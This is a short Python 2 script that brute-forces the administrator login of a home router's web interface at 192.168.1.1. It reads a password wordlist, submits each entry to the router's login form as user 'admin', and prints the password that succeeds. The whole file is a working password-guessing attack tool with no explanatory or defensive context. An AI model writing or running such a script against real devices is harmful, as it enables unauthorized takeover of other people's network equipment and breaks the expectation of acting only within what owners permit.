import mechanize
from termcolor import colored
import sys
listpass = sys.argv[1]
f = open(listpass, 'r')
passwd = f.read().splitlines()
for password in passwd:
	b = mechanize.Browser()
	url = 'http://192.168.1.1/Wizard/ge_login.cgi'
	response = b.open(url)
	b._factory.is_html = True
	b.select_form(name='authform')
	b.form['user'] = 'admin'
	b.form['password'] = (password)
	b.method = 'POST'
	response = b.submit()
	if response.geturl() == url:
		print 'admin | '+password +' | not found!'
	else:
		print response.geturl()
		print colored('admin | '+password +' | [+]found ![+]', 'red')
		exit()
#1p34
